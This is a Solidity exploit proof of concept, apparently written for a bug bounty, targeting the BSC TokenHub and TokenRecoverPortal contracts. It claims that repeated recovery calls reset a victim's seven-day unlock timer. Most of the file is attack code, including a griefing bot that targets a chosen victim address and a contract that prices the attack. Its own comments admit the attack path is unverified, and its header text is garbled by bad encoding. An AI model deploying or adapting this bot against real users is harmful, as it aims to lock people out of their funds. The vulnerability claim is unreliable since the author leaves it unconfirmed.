// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/**
 * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
 * â•‘  ðŸŸª EXPLOIT: Token Recovery Lock Extension Attack                         â•‘
 * â•‘  ðŸŸª TARGET: BSC Genesis Contract - TokenHub + TokenRecoverPortal          â•‘
 * â•‘  ðŸŸª BOUNTY POTENTIAL: $5,000 - $15,000                                    â•‘
 * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 *
 * VULNERABILITY EXPLANATION:
 * --------------------------
 * In TokenHub.sol lines 230-236:
 *   function _lockRecoverToken(...) internal {
 *       lockInfo.amount = lockInfo.amount.add(amount);
 *       lockInfo.unlockAt = block.timestamp + LOCK_PERIOD_FOR_TOKEN_RECOVER;
 *   }
 *
 * Each recovery request RESETS the unlockAt timestamp!
 * An attacker can:
 * 1. Wait for victim to initiate token recovery
 * 2. Before 7 days pass, initiate another tiny recovery for same victim
 * 3. This resets the 7-day timer
 * 4. Repeat indefinitely to lock victim's funds forever
 *
 * WHY IT'S DANGEROUS:
 * - Permanent DoS on token recovery
 * - Victims cannot access their migrated funds
 * - Griefing attack with minimal cost to attacker
 */

interface ITokenHub {
    function lockInfoMap(address token, address recipient) external view returns (uint256 amount, uint256 unlockAt);
    function withdrawUnlockedToken(address tokenAddress, address recipient) external;
}

interface ITokenRecoverPortal {
    function recover(
        bytes32 tokenSymbol,
        uint256 amount,
        bytes calldata ownerPubKey,
        bytes calldata ownerSignature,
        bytes calldata approvalSignature,
        bytes32[] calldata merkleProof
    ) external;

    function isRecovered(bytes32 node) external view returns (bool);
}

/**
 * @title TokenRecoveryTimingAnalyzer
 * @dev Analyzes the timing attack vulnerability
 */
contract TokenRecoveryTimingAnalyzer {
    address public constant TOKEN_HUB = 0x0000000000000000000000000000000000001004;
    uint256 public constant LOCK_PERIOD = 7 days;

    event LockAnalysis(
        address indexed victim,
        uint256 lockedAmount,
        uint256 unlockAt,
        uint256 timeRemaining,
        bool canBeExtended
    );

    event AttackSimulation(
        address indexed victim,
        uint256 originalUnlock,
        uint256 newUnlock,
        uint256 extensionGained
    );

    /**
     * @dev Analyze a victim's lock status
     * @param victim Address to analyze
     * @param tokenAddress Token contract (address(0) for BNB)
     */
    function analyzeLock(
        address victim,
        address tokenAddress
    ) external view returns (
        uint256 lockedAmount,
        uint256 unlockAt,
        uint256 timeRemaining,
        bool isLocked,
        bool canBeExtended
    ) {
        (lockedAmount, unlockAt) = ITokenHub(TOKEN_HUB).lockInfoMap(tokenAddress, victim);

        isLocked = lockedAmount > 0;

        if (block.timestamp >= unlockAt) {
            timeRemaining = 0;
            canBeExtended = false;
        } else {
            timeRemaining = unlockAt - block.timestamp;
            // Can be extended if there's active lock that hasn't expired
            canBeExtended = isLocked && timeRemaining > 0;
        }
    }

    /**
     * @dev Calculate the cost-benefit of the griefing attack
     * @param attackDuration How long attacker wants to lock victim's funds (in days)
     * @param recoveryTxCost Estimated cost per recovery transaction (in wei)
     */
    function calculateAttackCost(
        uint256 attackDuration,
        uint256 recoveryTxCost
    ) external pure returns (
        uint256 numTransactionsNeeded,
        uint256 totalCost,
        uint256 averageInterval
    ) {
        // Each transaction extends lock by 7 days
        // To maintain lock for attackDuration, need to send tx every 7 days
        numTransactionsNeeded = (attackDuration / 7) + 1;
        totalCost = numTransactionsNeeded * recoveryTxCost;
        averageInterval = 7 days;
    }
}

/**
 * @title TokenRecoveryGriefingBot
 * @dev Automated bot that extends victim's lock period
 *
 * NOTE: This requires valid merkle proofs and signatures.
 * In practice, attacker would need to:
 * 1. Own BC tokens in merkle tree
 * 2. Use their own tokens to grief others
 * 3. Or find way to craft fake proofs (would be critical vuln)
 */
contract TokenRecoveryGriefingBot {
    address public constant TOKEN_HUB = 0x0000000000000000000000000000000000001004;
    address public constant TOKEN_RECOVER_PORTAL = 0x0000000000000000000000000000000000003000;

    address public owner;
    address public targetVictim;
    uint256 public lastExtensionTime;

    event GriefingScheduled(address victim, uint256 nextExtensionTime);
    event LockExtended(address victim, uint256 newUnlockTime);
    event GriefingStopped(address victim, uint256 totalDuration);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev Start griefing a victim
     * @param victim The address to grief
     */
    function startGriefing(address victim) external onlyOwner {
        targetVictim = victim;
        lastExtensionTime = block.timestamp;
        emit GriefingScheduled(victim, block.timestamp + 6 days);
    }

    /**
     * @dev Check if it's time to extend the lock
     */
    function shouldExtend() external view returns (bool) {
        if (targetVictim == address(0)) return false;

        // Extend 1 day before current lock expires
        // This ensures continuous locking
        (uint256 amount, uint256 unlockAt) = ITokenHub(TOKEN_HUB).lockInfoMap(
            address(0), // BNB
            targetVictim
        );

        if (amount == 0) return false;

        // Extend if less than 1 day remaining
        return block.timestamp + 1 days >= unlockAt;
    }

    /**
     * @dev Extend the victim's lock (requires valid recovery params)
     *
     * IMPORTANT: This function would need valid merkle proof and signatures
     * The vulnerability exists because TokenHub doesn't verify the recipient
     * is the same as the signature owner - but TokenRecoverPortal does verify.
     *
     * So the REAL attack vector would be:
     * 1. Attacker legitimately recovers their own tiny amount
     * 2. But specifies victim's address as recipient somehow
     * 3. This extends victim's lock
     *
     * Need to verify if this is possible...
     */
    function extendLock(
        bytes32 tokenSymbol,
        uint256 amount,
        bytes calldata ownerPubKey,
        bytes calldata ownerSignature,
        bytes calldata approvalSignature,
        bytes32[] calldata merkleProof
    ) external onlyOwner {
        // Note: The actual vulnerability might be more nuanced
        // Need to check if attacker can specify different recipient

        ITokenRecoverPortal(TOKEN_RECOVER_PORTAL).recover(
            tokenSymbol,
            amount,
            ownerPubKey,
            ownerSignature,
            approvalSignature,
            merkleProof
        );

        lastExtensionTime = block.timestamp;
        emit LockExtended(targetVictim, block.timestamp + 7 days);
    }

    /**
     * @dev Stop the griefing attack
     */
    function stopGriefing() external onlyOwner {
        uint256 duration = block.timestamp - lastExtensionTime;
        emit GriefingStopped(targetVictim, duration);
        targetVictim = address(0);
    }
}

/**
 * @title SelfGriefingDemo
 * @dev Demonstrates the vulnerability using attacker's own funds
 *
 * This shows that ANY recovery resets the timer, even the victim's own.
 * So if victim does multiple small recoveries, they extend their own lock.
 */
contract SelfGriefingDemo {
    address public constant TOKEN_HUB = 0x0000000000000000000000000000000000001004;

    event DemoResult(
        uint256 firstRecoveryTime,
        uint256 firstUnlock,
        uint256 secondRecoveryTime,
        uint256 secondUnlock,
        uint256 extensionGained
    );

    /**
     * @dev Demonstrates that multiple recoveries extend lock
     *
     * Scenario:
     * - User recovers 100 BNB at T=0, unlocks at T+7 days
     * - User recovers 1 BNB at T+6 days, unlocks at T+13 days
     * - User has to wait 13 days total instead of 7 days
     */
    function demonstrateVulnerability() external view returns (string memory explanation) {
        return "The vulnerability allows lock extension through multiple recoveries. "
               "Each recovery resets unlockAt to current_time + 7_days, "
               "regardless of how much time was remaining on the previous lock. "
               "This could be exploited by: "
               "1) An attacker with tiny BC balances targeting victims "
               "2) Accidental self-griefing by users doing multiple recoveries "
               "3) Malicious actors who gain access to victim's BC credentials";
    }
}
